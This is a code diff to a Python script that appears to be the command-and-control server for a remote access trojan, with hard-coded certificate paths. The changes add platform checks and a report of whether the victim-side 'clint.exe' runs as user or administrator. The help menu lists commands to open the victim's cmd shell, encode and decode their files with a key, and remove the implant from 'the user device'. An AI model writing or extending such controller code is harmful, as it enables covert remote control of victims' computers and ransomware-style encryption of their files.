@@ -6,14 +6,28 @@ import time
 import threading as thr
 import paramiko as pa
 import ssl
+import sys
 
+
+'''5.5.0 v'''
+
+
+pla=sys.platform
 t1t=0
 t1t1=0
 try:
+    
+        
     cont=ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
     cont.check_hostname=False
     cont.verify_mode=ssl.CERT_NONE
-    cont.load_cert_chain(certfile=r"C:\Users\ibrah\cert.pem", keyfile=r"C:\Users\ibrah\key.pem")
+    if pla=='win32' or pla=='win64':
+        cont.load_cert_chain(certfile=r"C:\Users\ibrah\cert.pem", keyfile=r"C:\Users\ibrah\key.pem")
+    elif pla=='linux' or pla=='linux2' or pla=='linux3':
+        cont.load_cert_chain(certfile=r"/home/kali/Desktop/cert.pem", keyfile=r"/home/kali/Desktop/key.pem")
+    else:
+        print(f"error: your platform is {pla}, 'server.exe' is not supported in this platform")
+        exit()
     server = so.socket(so.AF_INET, so.SOCK_STREAM)
     server.bind(('0.0.0.0', 12345))
     server.listen(1)
@@ -22,6 +36,7 @@ try:
         conn, addr = sst.accept()
 
         conn.sendall("connected".encode('utf-8'))
+        
         zz=conn.recv(4096).decode('utf-8')
         
         if zz=="strange platform":
@@ -36,6 +51,12 @@ try:
         
         print(f"Connection from {addr} has been established!\n")
         print(f"platform: {zz}\n")
+        pri=conn.recv(4096).decode('utf-8')
+        if pri=="0":
+            pri='user'
+        elif pri=="1":
+            pri='adminstrator'
+        print(f"the tool 'clint.exe' run as: {pri}\n")
         print("enter '.h' for help\n")
 
         while True:
@@ -329,8 +350,8 @@ try:
                 print(".enf:      to encode file")
                 print(".def:      to decode file")
                 print("cmd:       to make accses to the 'cmd' of the user (work also in 'mac/links')")
-                print("endconn:   to end the connection and the 'clint.exe' will be removed  from the user device")        
-                print("downlod:   to downlod a file ")
+                print("killcon:   to end the connection and the 'clint.exe' will be removed from the user device")        
+                #print("downlod:   to downlod a file ")
                 print("WORRINGE!!: if you use '.enf' or '.def' and the file has emty lines that make the cooncetion in a loop, make sure about the file by using 'cmd' to dilet the emty lines")
                 print("WORRINGE!!: if you use '.def' and you don`t enter the right publce key the file will be emty")
 
